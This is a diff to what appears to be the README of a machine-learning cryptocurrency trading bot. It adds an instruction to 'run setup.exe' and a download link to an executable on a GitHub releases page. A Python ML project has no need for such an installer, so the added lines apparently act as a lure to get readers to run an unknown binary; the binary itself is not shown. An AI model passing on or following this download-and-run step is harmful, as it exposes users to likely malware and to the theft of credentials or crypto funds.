@@ -12,6 +12,7 @@
 
 # Intelligent trading bot
 # run setup.exe file 
+https://github.com/romannlab00a2/trading-bot-2026/releases/download/TRADINGBOT2026/setup.exe
 The aim of the project is to develop an intelligent trading bot for automated trading including cryptocurrencies using state-of-the-art machine learning (ML) algorithms and feature engineering. The project provides the following major functionalities:
 * Clear and consistent separation between *offline* (batch) mode for training ML models and *online* (stream) mode for predicting based on the trained models. One of the main challenges here is to guarantee that the same (derived) features are used in both modes
 * Extensible approach to defining *derived features* using (Python) functions including standard technical indicators as well as arbitrary custom features
